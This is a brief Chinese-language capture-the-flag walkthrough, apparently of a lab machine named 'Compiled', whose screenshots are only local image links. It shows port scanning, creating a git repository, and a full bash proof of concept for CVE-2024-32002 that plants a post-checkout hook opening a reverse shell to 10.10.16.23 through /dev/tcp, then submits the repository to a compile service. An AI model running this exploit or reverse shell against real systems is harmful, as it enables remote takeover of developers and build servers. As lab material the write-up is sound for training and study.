# Compiled



端口扫描

![image-20240730171605236](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730171605236.png)

![image-20240730171622618](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730171622618.png)

开放3000，5000端口

![image-20240731092231767](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240731092231767.png)

![image-20240731092248053](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240731092248053.png)



下面有个输入框，输入git项目地址会进行编译

![image-20240731092353083](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240731092353083.png)

源码

![image-20240731092607672](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240731092607672.png)

返回3000端口创建一个账户

![image-20240731092448639](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240731092448639.png)



创建一个repository

![image-20240731092848437](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240731092848437.png)

创建repository之后上传poc(https://github.com/safebuffer/CVE-2024-32002)

![image-20240731092951828](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240731092951828.png)



bash脚本

```shell
#!/bin/bash

# Set Git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true
# optional, but I added it to avoid the warning message
git config --global init.defaultBranch main 


# Define the tell-tale path
tell_tale_path="$PWD/tell.tale"

# Initialize the hook repository
git init hook
cd hook
mkdir -p y/hooks

# Write the malicious code to a hook
cat > y/hooks/post-checkout <<EOF
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.23/1223 0>&1'

EOF

# Make the hook executable: important
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m "post-checkout"

cd ..

# Define the hook repository path
hook_repo_path="$(pwd)/hook"

# Initialize the captain repository
git init captain
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"

# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
cd ..

git clone --recursive captain hooked

```



修改脚本后提交

![image-20240731095722753](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240731095722753.png)

到5000端口，将项目地址提交编译

![image-20240731095930857](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240731095930857.png)

监听

![image-20240731100023733](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240731100023733.png)
